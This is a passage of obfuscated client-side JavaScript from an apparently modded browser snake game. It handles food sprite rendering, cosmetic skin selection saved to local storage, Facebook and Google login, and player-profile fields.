          var _0x158a27 = new _0x31b4a1.Pi();
          _0x158a27.Ch = [];
          for (var _0xb5d19a = _0x224b11.ba(_0x377d52++), _0x8ecfc7 = 0; _0x8ecfc7 < _0xb5d19a; _0x8ecfc7++) {
            var _0x3f7cec = _0x224b11.ca(_0x377d52);
            _0x377d52 += 2;
            var _0x5ccc22 = _0x224b11.ea(_0x377d52);
            _0x377d52 += 4;
            _0x158a27.Ch.push(_0x31b4a1.Pi.Qi(_0x3f7cec, _0x5ccc22));
          }
          _0x158a27.zh = [];
          if (this.dh.hh.xg === _0x31b4a1.Ac.zc) {
            for (var _0x664323 = _0x224b11.ba(_0x377d52++), _0x184d80 = 0; _0x184d80 < _0x664323; _0x184d80++) {
              var _0x2c4c2b = _0x224b11.ba(_0x377d52);
              _0x377d52 += 1;
              var _0x3777b4 = _0x224b11.ea(_0x377d52);
              _0x377d52 += 4;
              _0x158a27.zh.push(_0x31b4a1.Pi.Ri(_0x2c4c2b, _0x3777b4));
            }
          }
          _0xe610a0().og.af.ng.Vg.Uf(_0x158a27);
        };
        _0x49fe2a.prototype.vi = function (_0x18707e) {
          if (_0x18707e === this.dh.hh.yg) {
            return this.dh.ch;
          } else {
            return this.dh.Fh[_0x18707e];
          }
        };
        _0x49fe2a.prototype.Ai = function (_0x4a558d, _0x272391, _0x3e00f4) {
          return (((_0x3e00f4 & 255 | _0x272391 << 8 & 65280 | _0x4a558d << 16 & 16711680) & 16777215) / 8388608 - 1) * 10000;
        };
        _0x49fe2a.prototype.Ji = function (_0x2b67ec) {
          return ((_0x2b67ec & 65535) / 32768 - 1) * this.dh.hh.Dg();
        };
        _0x49fe2a.prototype.Ki = function (_0x7980d4) {
          return ((_0x7980d4 >> 16 & 65535) / 32768 - 1) * this.dh.hh.Dg();
        };
        _0x49fe2a.prototype._h = function (_0x15fb86, _0x53a61a) {
          var _0x4c1a8d = _0x15fb86.ba(_0x53a61a);
          if ((_0x4c1a8d & 128) == 0) {
            return _0x4c1a8d;
          }
          var _0x3cd527 = _0x15fb86.ba(_0x53a61a + 1);
          if ((_0x3cd527 & 128) == 0) {
            return _0x3cd527 | _0x4c1a8d << 7 & 16256;
          }
          var _0x31dbf7 = _0x15fb86.ba(_0x53a61a + 2);
          if ((_0x31dbf7 & 128) == 0) {
            return _0x31dbf7 | _0x3cd527 << 7 & 16256 | _0x4c1a8d << 14 & 2080768;
          }
          var _0x3c1d73 = _0x15fb86.ba(_0x53a61a + 3);
          if ((_0x3c1d73 & 128) == 0) {
            return _0x3c1d73 | _0x31dbf7 << 7 & 16256 | _0x3cd527 << 14 & 2080768 | _0x4c1a8d << 21 & 266338304;
          } else {
            return undefined;
          }
        };
        _0x49fe2a.prototype.ai = function (_0x2d758e) {
          if (_0x2d758e < 128) {
            return 1;
          } else if (_0x2d758e < 16384) {
            return 2;
          } else if (_0x2d758e < 2097152) {
            return 3;
          } else if (_0x2d758e < 268435456) {
            return 4;
          } else {
            return undefined;
          }
        };
        return _0x49fe2a;
      }();
      _0x31b4a1.Si = function () {
        function _0x4128ec(_0x3354d6) {
          this.Ti = _0x3354d6;
        }
        _0x4128ec.Ui = function () {
          return new _0x31b4a1.Si(null);
        };
        _0x4128ec.Vi = function (_0x4375c5) {
          return new _0x31b4a1.Si(_0x4375c5);
        };
        _0x4128ec.prototype.bc = function () {
          return this.Ti;
        };
        _0x4128ec.prototype.Wi = function () {
          return this.Ti != null;
        };
        _0x4128ec.prototype.Xi = function (_0x17a720) {
          if (this.Ti != null) {
            _0x17a720(this.Ti);
          }
        };
        return _0x4128ec;
      }();
      _0x31b4a1.Fi = function () {
        function _0x5b26db(_0x3a88cd, _0x3e6f4c) {
          this.Eh = _0x3a88cd;
          this.Yi = _0x3a88cd.Hh >= 80;
          this.Zi = 0;
          this.$i = 0;
          this._i = 0;
          this.aj = 0;
          this.Mi = this.Yi ? 1 : _0x3a88cd.Gi;
          this.Li = 1;
          this.Ni = false;
          this.bj = 0;
          this.cj = 0;
          this.dj = 1;
          this.ej = Math.random() * 6.283185307179586;
          this.fj = new _0x31b4a1.PortionSpriteTree();
          this.fj.yc(_0xe610a0().dh.hh.xg, this.Eh.Gh === _0x31b4a1.GameParams.Cg ? null : _0xe610a0().Lc.Ub().jb(this.Eh.Gh), _0xe610a0().Lc.Ub().ob(this.Eh.Hh));
          _0x3e6f4c.mh(_0x3a88cd.ae, this.fj);
        }
        _0x5b26db.prototype.si = function () {
          this.fj.nh.Dc.Rc();
          this.fj.nh.Cc.Rc();
          this.fj.nh.Dc.xc.width = 100;
          this.fj.nh.Dc.xc.height = 100;
        };
        _0x5b26db.prototype.Ii = function (_0x1e8b99, _0x1418d2, _0x1a987f) {
          this.Zi = _0x1e8b99;
          this.$i = _0x1418d2;
          if (_0x1a987f) {
            this._i = _0x1e8b99;
            this.aj = _0x1418d2;
          }
        };
        _0x5b26db.prototype.hj = function (_0xc0f829, _0x2c0302) {
          var _0x5b9f29 = Math.min(0.5, this.Mi * 1);
          var _0x5abf05 = Math.min(2.5, this.Mi * 1.5);
          this.bj = _0x2c22d1.Q(this.bj, _0x5b9f29, _0x2c0302, 0.0025);
          this.cj = _0x2c22d1.Q(this.cj, _0x5abf05, _0x2c0302, 0.0025);
          this.dj = _0x2c22d1.Q(this.dj, this.Li, _0x2c0302, 0.0025);
        };
        _0x5b26db.prototype.ij = function (_0xf17c1a, _0x3dbf71, _0x2c57ca) {
          this._i = _0x2c22d1.Q(this._i, this.Zi, _0x3dbf71, window.vps.eat_animation);
          this.aj = _0x2c22d1.Q(this.aj, this.$i, _0x3dbf71, 0.0025);
          this.fj.Uf(this, _0xf17c1a, _0x3dbf71, _0x2c57ca);
        };
        _0x5b26db.li = function () {
          function _0x18acb3() {
            this.me = 0;
            this.ae = 0;
            this.Gh = _0x261341.ps ? _0x261341.ps : _0x31b4a1.GameParams.Cg;
            this.Gi = 0;
            this.Hh = 0;
          }
          return _0x18acb3;
        }();
        return _0x5b26db;
      }();
      _0x31b4a1.PortionSpriteTree = function () {
        var _0x5de31e = 500;
        var _0x4be539 = 100;
        function _0x255dee() {
          this.nh = new _0x2c018e(new _0x31b4a1.sc(), new _0x31b4a1.sc());
          this.nh.Dc.xc.blendMode = _0x131478.v.z;
          this.nh.Dc.xc.zIndex = _0x4be539;
          this.nh.Cc.xc.zIndex = _0x5de31e;
        }
        _0x255dee.prototype.yc = function (_0x52ab00, _0x21ab10, _0x50c626) {
          var _0x5ead50 = _0x50c626.ub;
          if (_0x5ead50) {
            this.nh.Cc.Bc(_0x5ead50);
          }
          var _0x4471a1 = _0x52ab00 === _0x31b4a1.Ac.zc && _0x21ab10 ? _0x21ab10.sb.vb : _0x50c626.vb;
          if (_0x4471a1) {
            this.nh.Dc.Bc(_0x4471a1);
          }
        };
        _0x255dee.prototype.Uf = function (_0xea0888, _0x59732d, _0x56efe4, _0x4377c8) {
          if (!_0x4377c8(_0xea0888._i, _0xea0888.aj)) {
            this.nh.Uc();
          } else {
            var _0x325d50 = _0x1de86b > 1 ? _0x1de86b / 5 : 0;
            var _0x345006 = _0xea0888.cj * 1 + Math.cos(_0xea0888.ej + _0x59732d / 200) * 0.3;
            if (_0xea0888.Yi) {
              this.nh.Sc(_0xea0888._i, _0xea0888.aj, _0xea0888.bj * 2 * window.vps.PortionSize + _0x325d50, _0xea0888.dj * 1 * window.vps.PortionSize + _0x325d50, _0x345006 * 1.2 * window.vps.PortionAura + _0x325d50, _0xea0888.dj * window.vps.PortionTransparent);
            } else {
              this.nh.Sc(_0xea0888._i, _0xea0888.aj, _0xea0888.bj * 2 * window.vps.FoodSize, _0xea0888.dj * 1 * window.vps.FoodSize, _0x345006 * 2 * window.vps.FoodShadow, _0xea0888.dj * window.vps.FoodTransparent);
            }
          }
        };
        var _0x2c018e = function () {
          function _0x5a771f(_0x40ee6e, _0xf62a3e) {
            this.Cc = _0x40ee6e;
            this.Dc = _0xf62a3e;
          }
          _0x5a771f.prototype.Sc = function (_0x129f6d, _0x245bec, _0x339f4e, _0x2b2f4b, _0x13d563, _0x23b84b) {
            this.Cc.kd(true);
            this.Cc.ld(_0x129f6d, _0x245bec);
            this.Cc.Tc(_0x339f4e);
            this.Cc.jj(_0x2b2f4b);
            this.Dc.kd(true);
            this.Dc.ld(_0x129f6d, _0x245bec);
            this.Dc.Tc(_0x13d563);
            this.Dc.jj(_0x23b84b);
          };
          _0x5a771f.prototype.Uc = function () {};
          return _0x5a771f;
        }();
        return _0x255dee;
      }();
      _0x31b4a1.kj = function () {
        function _0x20975f() {
          this.lj = 0;
          this.mj = 0;
          this.nj = 0;
          this.oj = 0;
          this.pj = 0;
          this.qj = [];
        }
        function _0x3f0938(_0xfe0693, _0x54a3a3) {
          for (var _0x106033 = 0; _0x106033 < _0xfe0693.length; _0x106033++) {
            if (_0xfe0693[_0x106033].id == _0x54a3a3) {
              return _0x106033;
            }
          }
          return -1;
        }
        _0x20975f.prototype.ha = function () {};
        _0x20975f.prototype.rj = function (_0x42bbc1) {
          if (!window.vps.loading) {
            window.vps.PropertyManager = _0x565fbe({}, this);
            window.vps.a = this.lj;
            window.vps.b = this.mj;
            window.vps.c = this.nj;
            window.vps.d = this.pj;
            window.vps.e = this.oj;
            localStorage.setItem("SaveGamewup", JSON.stringify(vps));
            const _0x3182b2 = JSON.parse(localStorage.getItem("SaveGameup") || "{}");
            _0x3182b2.a = this.lj;
            _0x3182b2.b = this.mj;
            _0x3182b2.c = this.nj;
            _0x3182b2.d = this.pj;
            _0x3182b2.e = this.oj;
            localStorage.setItem("SaveGameup", JSON.stringify(_0x3182b2));
          }
          switch (_0x42bbc1) {
            case _0x31b4a1.tj.sj:
              return this.lj;
            case _0x31b4a1.tj.uj:
              return this.mj;
            case _0x31b4a1.tj.vj:
              return this.nj;
            case _0x31b4a1.tj.wj:
              return this.oj;
            case _0x31b4a1.tj.xj:
              return this.pj;
          }
          return 0;
        };
        _0x20975f.prototype.yj = function () {
          return new _0x31b4a1.hb(this.lj, this.mj, this.nj, this.oj, this.pj);
        };
        _0x20975f.prototype.zj = function (_0x392412) {
          this.qj.push(_0x392412);
          this.Aj();
        };
        _0x20975f.prototype.Bj = function () {
          if (!_0xe610a0().Lc.Wb()) {
            return _0x2c22d1.W([32, 33, 34, 35]);
          }
          var _0x42761a = [];
          for (var _0x45c47d = _0xe610a0().Lc.Xb().skinArrayDict, _0x35a3f3 = 0; _0x35a3f3 < _0x45c47d.length; _0x35a3f3++) {
            var _0x14c611 = _0x45c47d[_0x35a3f3];
            if (this.Cj(_0x14c611.id, _0x31b4a1.tj.sj)) {
              _0x42761a.push(_0x14c611);
            }
          }
          if (_0x42761a.length === 0) {
            return 0;
          } else {
            return _0x42761a[parseInt(_0x42761a.length * Math.random())].id;
          }
        };
        _0x20975f.prototype.Dj = function () {
          if (_0xe610a0().Lc.Wb()) {
            var _0x5178a5 = _0xe610a0().Lc.Xb().skinArrayDict;
            var _0xa5b57f = _0x3f0938(_0x5178a5, this.lj);
            if (!(_0xa5b57f < 0)) {
              for (var _0x4949ea = _0xa5b57f + 1; _0x4949ea < _0x5178a5.length; _0x4949ea++) {
                if (this.Cj(_0x5178a5[_0x4949ea].id, _0x31b4a1.tj.sj)) {
                  this.lj = _0x5178a5[_0x4949ea].id;
                  this.Aj();
                  return;
                }
              }
              for (var _0x24ff40 = 0; _0x24ff40 < _0xa5b57f; _0x24ff40++) {
                if (this.Cj(_0x5178a5[_0x24ff40].id, _0x31b4a1.tj.sj)) {
                  this.lj = _0x5178a5[_0x24ff40].id;
                  this.Aj();
                  return;
                }
              }
            }
          }
        };
        _0x20975f.prototype.Ej = function () {
          var _0xfda492 = _0xe610a0();
          if (_0xfda492.Lc.Wb) {
            var _0x2ae0e3 = _0xfda492.Lc.Xb().skinArrayDict;
            var _0x337daa = _0x3f0938(_0x2ae0e3, this.lj);
            if (!(_0x337daa < 0)) {
              for (var _0x114ca0 = _0x337daa - 1; _0x114ca0 >= 0; _0x114ca0--) {
                if (this.Cj(_0x2ae0e3[_0x114ca0].id, _0x31b4a1.tj.sj)) {
                  this.lj = _0x2ae0e3[_0x114ca0].id;
                  this.Aj();
                  return;
                }
              }
              for (var _0x44b63c = _0x2ae0e3.length - 1; _0x44b63c > _0x337daa; _0x44b63c--) {
                if (this.Cj(_0x2ae0e3[_0x44b63c].id, _0x31b4a1.tj.sj)) {
                  this.lj = _0x2ae0e3[_0x44b63c].id;
                  this.Aj();
                  return;
                }
              }
            }
          }
        };
        _0x20975f.prototype.Fj = function (_0x4f0365, _0x5dc2bc) {
          if (!_0xe610a0().Lc.Wb() || this.Cj(_0x4f0365, _0x5dc2bc)) {
            switch (_0x5dc2bc) {
              case _0x31b4a1.tj.sj:
                if (this.lj !== _0x4f0365) {
                  this.lj = _0x4f0365;
                  this.Aj();
                }
                return;
              case _0x31b4a1.tj.uj:
                if (this.mj !== _0x4f0365) {
                  this.mj = _0x4f0365;
                  this.Aj();
                }
                return;
              case _0x31b4a1.tj.vj:
                if (this.nj !== _0x4f0365) {
                  this.nj = _0x4f0365;
                  this.Aj();
                }
                return;
              case _0x31b4a1.tj.wj:
                if (this.oj !== _0x4f0365) {
                  this.oj = _0x4f0365;
                  this.Aj();
                }
                return;
              case _0x31b4a1.tj.xj:
                if (this.pj !== _0x4f0365) {
                  this.pj = _0x4f0365;
                  this.Aj();
                }
                return;
            }
          }
        };
        _0x20975f.prototype.Cj = function (_0x55e842, _0x4d3547) {
          var _0x2b48d7 = this.Gj(_0x55e842, _0x4d3547);
          return _0x2b48d7 != null && (_0xe610a0().Ij.Hj() ? _0x2b48d7.Jj() === 0 && !_0x2b48d7.Kj() || _0xe610a0().Ij.Lj(_0x55e842, _0x4d3547) : _0x2b48d7.Mj());
        };
        _0x20975f.prototype.Gj = function (_0x21682f, _0xd56970) {
          if (!_0xe610a0().Lc.Wb()) {
            return null;
          }
          var _0x42269b = _0xe610a0().Lc.Xb();
          if (_0xd56970 === _0x31b4a1.tj.sj) {
            var _0x47fa1e = _0x3f0938(_0x42269b.skinArrayDict, _0x21682f);
            if (_0x47fa1e < 0) {
              return null;
            } else {
              return _0x31b4a1.Oj.Nj(_0x42269b.skinArrayDict[_0x47fa1e]);
            }
          }
          var _0x1b3df7 = null;
          switch (_0xd56970) {
            case _0x31b4a1.tj.uj:
              _0x1b3df7 = _0x42269b.eyesDict[_0x21682f];
              break;
            case _0x31b4a1.tj.vj:
              _0x1b3df7 = _0x42269b.mouthDict[_0x21682f];
              break;
            case _0x31b4a1.tj.wj:
              _0x1b3df7 = _0x42269b.hatDict[_0x21682f];
              break;
            case _0x31b4a1.tj.xj:
              _0x1b3df7 = _0x42269b.glassesDict[_0x21682f];
          }
          if (_0x1b3df7 != null) {
            return _0x31b4a1.Oj.Pj(_0x1b3df7);
          } else {
            return null;
          }
        };
        _0x20975f.prototype.Aj = function () {
          for (var _0x1353d4 = 0; _0x1353d4 < this.qj.length; _0x1353d4++) {
            this.qj[_0x1353d4]();
          }
        };
        return _0x20975f;
      }();
      _0x31b4a1.tj = function () {
        function _0x30e3bb() {}
        _0x30e3bb.sj = "SKIN";
        _0x30e3bb.uj = "EYES";
        _0x30e3bb.vj = "MOUTH";
        _0x30e3bb.xj = "GLASSES";
        _0x30e3bb.wj = "HAT";
        return _0x30e3bb;
      }();
      _0x31b4a1.Qj = function () {
        function _0x19094d() {
          this.Bf = new _0x131478.Texture(_0x131478.BaseTexture.from("/images/bg-obstacle.png"));
          this.Cf = new Array(36);
          this._g = _0x261341.bgg();
          this.ah = new _0x131478.Texture(function () {
            var _0x146643 = _0x131478.BaseTexture.from("/images/bg-pattern-pow2-TEAM2.png");
            _0x146643.wrapMode = _0x131478.C.D;
            return _0x146643;
          }());
          this.Zg = new _0x131478.Texture(_0x131478.BaseTexture.from("/images/lens.png"));
          this.rf = null;
          this.Db = function () {
            var _0x32e22b = window.document.createElement("canvas");
            _0x32e22b.width = 80;
            _0x32e22b.height = 80;
            return {
              Eb: _0x32e22b,
              Fb: _0x32e22b.getContext("2d"),
              oa: new _0x131478.Texture(_0x131478.BaseTexture.from(_0x32e22b))
            };
          }();
          this.Ae = {};
          this.we = {};
          this.Rj = [];
          this.Sj = null;
        }
        _0x19094d.prototype.ha = function (_0x1084f6) {
          function _0x147f78() {
            if (--_0xcebe10 == 0) {
              _0x1084f6();
            }
          }
          var _0xcebe10 = 4;
          this.Ae = {};
          _0x147f78();
          this.we = {};
          _0x147f78();
          this.Rj = [];
          _0x147f78();
          this.Sj = null;
          _0x147f78();
        };
        return _0x19094d;
      }();
      _0x31b4a1.Tj = function () {
        function _0x5c2636() {
          this.Uj = null;
          this.af = new _0x31b4a1.Vj();
          this._e = new _0x31b4a1.Wj();
          this.Xj = new _0x31b4a1.Yj();
          this.Zj = new _0x31b4a1.$j();
          this._j = new _0x31b4a1.ak();
          this.bk = new _0x31b4a1.ck();
          this.dk = new _0x31b4a1.ek();
          this.fk = new _0x31b4a1.gk();
          this.$h = new _0x31b4a1.hk();
          this.ik = new _0x31b4a1.jk();
          this.kk = new _0x31b4a1.lk();
          this.mk = new _0x31b4a1.nk();
          this.ok = new _0x31b4a1.pk();
          this.qk = new _0x31b4a1.rk();
          this.ie = new _0x31b4a1.sk();
          this.tk = new _0x31b4a1.uk();
          this.vk = new _0x31b4a1.wk();
          this.xk = new _0x31b4a1.yk();
          this.zk = [];
        }
        function _0x326782(_0x19bdb6, _0x1ebd0e) {
          if (_0x1ebd0e !== 0) {
            var _0x536321 = _0x19bdb6[_0x1ebd0e];
            _0x2c22d1.T(_0x19bdb6, 0, 1, _0x1ebd0e);
            _0x19bdb6[0] = _0x536321;
          }
        }
        function _0x19d980(_0x4dded5, _0xb28c2f) {
          if (_0xb28c2f !== _0x4dded5.length + 1) {
            var _0x1f03e5 = _0x4dded5[_0xb28c2f];
            _0x2c22d1.T(_0x4dded5, _0xb28c2f + 1, _0xb28c2f, _0x4dded5.length - _0xb28c2f - 1);
            _0x4dded5[_0x4dded5.length - 1] = _0x1f03e5;
          }
        }
        function _0x415d47(_0x403a05, _0x60403) {
          for (var _0x544b10 = 0; _0x544b10 < _0x403a05.length; _0x544b10++) {
            if (_0x403a05[_0x544b10] === _0x60403) {
              return _0x544b10;
            }
          }
          return -1;
        }
        _0x5c2636.prototype.ha = function () {
          this.Uj = null;
          this.zk = [this.af, this._e, this.Xj, this.Zj, this._j, this.bk, this.dk, this.fk, this.$h, this.ik, this.kk, this.mk, this.ok, this.qk, this.ie, this.tk, this.vk, this.xk];
          for (var _0x56b0f8 = 0; _0x56b0f8 < this.zk.length; _0x56b0f8++) {
            this.zk[_0x56b0f8].ha();
          }
        };
        _0x5c2636.prototype.lh = function (_0x241615, _0x105983) {
          for (var _0xb410f0 = this.zk.length - 1; _0xb410f0 >= 0; _0xb410f0--) {
            this.zk[_0xb410f0].Nf(_0x241615, _0x105983);
          }
          if (this.zk[0] !== this.af && this.zk[0] !== this.xk && this.Uj != null) {
            this.Uj.Nf(_0x241615, _0x105983);
          }
        };
        _0x5c2636.prototype.Jf = function () {
          for (var _0x360a42 = this.zk.length - 1; _0x360a42 >= 0; _0x360a42--) {
            this.zk[_0x360a42].Jf();
          }
          if (this.Uj != null) {
            this.Uj.Jf();
          }
        };
        _0x5c2636.prototype.Ak = function (_0x160c22) {
          var _0x2b6955 = _0x415d47(this.zk, _0x160c22);
          if (!(_0x2b6955 < 0)) {
            this.zk[0].Bk();
            _0x326782(this.zk, _0x2b6955);
            this.Ck();
          }
        };
        _0x5c2636.prototype.Dk = function () {
          this.zk[0].Bk();
          do {
            _0x19d980(this.zk, 0);
          } while (this.zk[0].nd !== _0x31b4a1.Fk.Ek);
          this.Ck();
        };
        _0x5c2636.prototype.Ck = function () {
          var _0x1b0478 = this.zk[0];
          _0x1b0478.Gk();
          _0x1b0478.Hk();
          this.Ik();
        };
        _0x5c2636.prototype.Jk = function () {
          return this.zk.length !== 0 && this.zk[0].nd === _0x31b4a1.Fk.Ek && this.qk.Kk();
        };
        _0x5c2636.prototype.Lk = function () {
          if (this.zk.length === 0) {
            return null;
          } else {
            return this.zk[0];
          }
        };
        _0x5c2636.prototype.Ik = function () {
          if (this.Jk()) {
            this.Ak(this.qk);
          }
        };
        return _0x5c2636;
      }();
      _0x31b4a1.Pi = function () {
        function _0x20f110() {
          this.Ch = [];
          this.zh = [];
        }
        _0x20f110.Qi = function (_0x376b35, _0x26b31b) {
          return {
            Dh: _0x376b35,
            Bh: _0x26b31b
          };
        };
        _0x20f110.Ri = function (_0x1612ec, _0x1f5c46) {
          return {
            Ah: _0x1612ec,
            Bh: _0x1f5c46
          };
        };
        return _0x20f110;
      }();
      _0x31b4a1.Mk = function () {
        function _0x15fb34() {
          this.setNk = new WeakSet();
          this.Nk = [];
          this.Ok = [];
          this.Pk = false;
          this.Qk = _0x5d0fb8;
          this.Rk = {};
        }
        var _0x5d0fb8 = "guest";
        _0x15fb34.Sk = new (function () {
          function _0x485ba7() {}
          _0x485ba7.Tk = function () {
            function _0x2393cc(_0x5f29c4) {
              this.Uk = _0x5f29c4;
            }
            return _0x2393cc;
          }();
          _0x485ba7.prototype.Vk = function () {
            return typeof FB != "undefined";
          };
          _0x485ba7.prototype.Wk = function (_0x4d3495, _0x296814, _0x4cb192) {
            var _0x1cead4 = "https://graph.facebook.com/me?access_token=" + _0x4d3495;
            $.get(_0x1cead4).fail(function () {
              _0x296814();
            }).done(function () {
              _0x4cb192();
            });
          };
          _0x485ba7.prototype.Xk = function (_0x32fdb3, _0xb36553) {
            if (!this.Vk()) {
              _0x32fdb3();
              return;
            }
            this.Yk(function () {
              FB.login(function (_0x228830) {
                if (_0x228830.status !== "connected") {
                  _0x32fdb3();
                  return;
                }
                var _0x16570b = _0x228830.authResponse.accessToken;
                _0xb36553(new _0x485ba7.Tk(_0x16570b));
              });
            }, function (_0x288f3f) {
              _0xb36553(_0x288f3f);
            });
          };
          _0x485ba7.prototype.Yk = function (_0x3e9723, _0x3bad2c) {
            var _0xcd156b = this;
            if (!this.Vk()) {
              _0x3e9723();
              return;
            }
            FB.getLoginStatus(function (_0x231a13) {
              if (_0x231a13.status !== "connected") {
                _0x3e9723();
                return;
              }
              var _0x5129be = _0x231a13.authResponse.accessToken;
              _0xcd156b.Wk(_0x5129be, function () {
                _0x3e9723();
              }, function () {
                _0x3bad2c(new _0x485ba7.Tk(_0x5129be));
              });
            });
          };
          _0x485ba7.prototype.Zk = function () {
            if (this.Vk()) {
              FB.logout();
            }
          };
          return _0x485ba7;
        }())();
        _0x15fb34.$k = new (function () {
          function _0x50cfc8() {}
          _0x50cfc8._k = function () {
            function _0x5aa175(_0x1d2240, _0x7c7e20) {
              this.Uk = _0x1d2240;
              this.al = _0x7c7e20;
            }
            return _0x5aa175;
          }();
          _0x50cfc8.prototype.Vk = function () {
            return typeof _0x507f56 !== "undefined";
          };
          _0x50cfc8.prototype.Xk = function (_0x5aa87b, _0x2e9baa) {
            if (typeof _0x507f56 === "undefined") {
              _0x5aa87b();
              return;
            }
            if (_0x507f56 === undefined) {
              _0x5aa87b();
              return;
            }
            _0x507f56.then(function () {
              if (_0x507f56.isSignedIn.get()) {
                var _0x4c81d8 = _0x507f56.currentUser.get();
                var _0x2eeed0 = _0x4c81d8.getAuthResponse().id_token;
                var _0x282d8c = new Date().getTime() + _0x4c81d8.getAuthResponse().expires_in * 1000;
                if (new Date().getTime() < _0x282d8c) {
                  _0x2e9baa(new _0x50cfc8._k(_0x2eeed0, _0x282d8c));
                  return;
                }
              }
              _0x507f56.signIn().then(function (_0x4606a3) {
                if (typeof _0x4606a3.error !== "undefined") {
                  _0x5aa87b();
                  return;
                }
                if (!_0x4606a3.isSignedIn()) {
                  _0x5aa87b();
                  return;
                }
                var _0x1bf395 = _0x4606a3.getAuthResponse().id_token;
                var _0x27319c = new Date().getTime() + _0x4606a3.getAuthResponse().expires_in * 1000;
                _0x2e9baa(new _0x50cfc8._k(_0x1bf395, _0x27319c));
              });
            });
          };
          _0x50cfc8.prototype.Yk = function (_0x4c5c7b, _0x18f2bf) {
            if (_0x507f56 === undefined) {
              _0x4c5c7b();
              return;
            }
            _0x507f56.then(function () {
              if (_0x507f56.isSignedIn.get()) {
                var _0x4eae96 = _0x507f56.currentUser.get();
                var _0x23b71b = _0x4eae96.getAuthResponse().id_token;
                var _0x70b41 = new Date().getTime() + _0x4eae96.getAuthResponse().expires_in * 1000;
                if (new Date().getTime() < _0x70b41) {
                  _0x18f2bf(new _0x50cfc8._k(_0x23b71b, _0x70b41));
                  return;
                }
              }
              _0x4c5c7b();
            });
          };
          _0x50cfc8.prototype.Zk = function () {
            if (_0x507f56 !== undefined) {
              _0x507f56.signOut();
            }
          };
          return _0x50cfc8;
        }())();
        _0x15fb34.prototype.ha = function () {
          this.bl();
        };
        _0x15fb34.prototype.cl = function () {
          if (this.Pk) {
            return this.Rk.userId;
          } else {
            return "";
          }
        };
        _0x15fb34.prototype.dl = function () {
          if (this.Pk) {
            return this.Rk.username;
          } else {
            return "";
          }
        };
        _0x15fb34.prototype.el = function () {
          if (this.Pk) {
            return this.Rk.nickname.substring(0, _0xff4a8c);
          } else {
            return "";
          }
        };
        _0x15fb34.prototype.fl = function () {
          if (this.Pk) {
            return this.Rk.avatarUrl;
          } else {
            return GUEST_AVATAR_URL;
          }
        };
        _0x15fb34.prototype.gl = function () {
          return this.Pk && this.Rk.isBuyer;
        };
        _0x15fb34.prototype.hl = function () {
          return this.Pk && this.Rk.isConsentGiven;
        };
        _0x15fb34.prototype.il = function () {
          if (this.Pk) {
            return this.Rk.coins;
          } else {
            return 0;
          }
        };
        _0x15fb34.prototype.jl = function () {
          if (this.Pk) {
            return this.Rk.level;
          } else {
            return 1;
          }
        };
        _0x15fb34.prototype.kl = function () {
          if (this.Pk) {
            return this.Rk.expOnLevel;
          } else {
            return 0;
          }
        };
        _0x15fb34.prototype.ll = function () {
          if (this.Pk) {
            return this.Rk.expToNext;
          } else {
            return 50;
          }
        };
        _0x15fb34.prototype.ml = function () {
          if (this.Pk) {
            return this.Rk.skinId;
          } else {
            return 0;
          }
        };
        _0x15fb34.prototype.nl = function () {
          if (this.Pk) {
            return this.Rk.eyesId;
          } else {
            return 0;
          }
        };
        _0x15fb34.prototype.ol = function () {
          if (this.Pk) {
            return this.Rk.mouthId;
          } else {
            return 0;
          }
        };
        _0x15fb34.prototype.pl = function () {
          if (this.Pk) {
            return this.Rk.glassesId;
          } else {
            return 0;
          }
        };
        _0x15fb34.prototype.ql = function () {
          if (this.Pk) {
            return this.Rk.hatId;
          } else {
            return 0;
          }
        };
        _0x15fb34.prototype.rl = function () {
          if (this.Pk) {
            return this.Rk.highScore;
          } else {
            return 0;
          }
        };
        _0x15fb34.prototype.sl = function () {
          if (this.Pk) {
            return this.Rk.bestSurvivalTimeSec;
          } else {
            return 0;
          }
        };
        _0x15fb34.prototype.tl = function () {
          if (this.Pk) {
            return this.Rk.kills;
          } else {
            return 0;
          }
        };
        _0x15fb34.prototype.ul = function () {
          if (this.Pk) {
            return this.Rk.headShots;
          } else {
            return 0;
          }
        };
        _0x15fb34.prototype.vl = function () {
          if (this.Pk) {
            return this.Rk.sessionsPlayed;
          } else {
            return 0;
          }
        };
        _0x15fb34.prototype.wl = function () {
          if (this.Pk) {
            return this.Rk.totalPlayTimeSec;
          } else {
            return 0;
          }
        };
        _0x15fb34.prototype.xl = function () {
          if (this.Pk) {
            return this.Rk.regDate;
          } else {
            return {};
          }
        };
        _0x15fb34.prototype.yl = function (_0x14cae6) {
          this.Nk.push(_0x14cae6);
          _0x14cae6();
        };
        _0x15fb34.prototype.zl = function (_0x4c636f) {
          this.Ok.push(_0x4c636f);
          _0x4c636f();
        };
        _0x15fb34.prototype.Lj = function (_0x2f8e55, _0x38a087) {
          var _0x50949d = this.Rk.propertyList;
          if (_0x50949d == null) {
            return false;
          }
          var _0xd8d542 = _0x2f8e55.toString();
          for (var _0x3c3293 = 0; _0x3c3293 < _0x50949d.length; _0x3c3293++) {
            var _0x3c63d0 = _0x50949d[_0x3c3293];
            if (_0x3c63d0.id === _0xd8d542 && _0x3c63d0.type === _0x38a087) {
              return true;
            }
          }
          return false;
        };
        _0x15fb34.prototype.Hj = function () {
          return this.Pk;
        };
        _0x15fb34.prototype.Al = function () {
          return this.Qk;
        };
        _0x15fb34.prototype.Bl = function (_0x2e756b) {
          var _0x16d15e = this;
          var _0x35ce1f = this.cl();
          var _0x34ea3f = this.il();
          var _0x1ad00e = this.jl();
          this.Cl(function () {
            if (_0x2e756b != null) {
              _0x2e756b();
            }
          }, function (_0x5e18d5) {
            _0x52c55d(_0x5e18d5.user_data);
            _0x16d15e.Rk = _0x5e18d5.user_data;
            _0x16d15e.Dl();
            _0x16d15e.Rk.isConsentGiven = true;
            var _0x527b8f = _0x16d15e.cl();
            var _0x2330ef = _0x16d15e.il();
            var _0x41ee26 = _0x16d15e.jl();
            if (_0x35ce1f === _0x527b8f) {
              if (_0x41ee26 > 1 && _0x41ee26 !== _0x1ad00e) {
                _0xe610a0().og.qk.El(new _0x31b4a1.Fl(currLevel));
              }
              var _0x144750 = _0x2330ef - _0x34ea3f;
              if (_0x144750 >= 20) {
                _0xe610a0().og.qk.El(new _0x31b4a1.Gl(_0x144750));
              }
            }
            if (_0x2e756b != null) {
              _0x2e756b();
            }
          });
        };
        _0x15fb34.prototype.Cl = function (_0x3f7ed8, _0x3a8123) {
          var _0x38a125 = _0x2c22d1.a.b + "/pub/wuid/" + this.Qk + "/getUserData";
          vps.wuid = this.Qk;
          _0x2c22d1.Z(_0x38a125, _0x3f7ed8, function (_0x5a4428) {
            if (_0x5a4428.code !== 1200) {
              _0x3f7ed8();
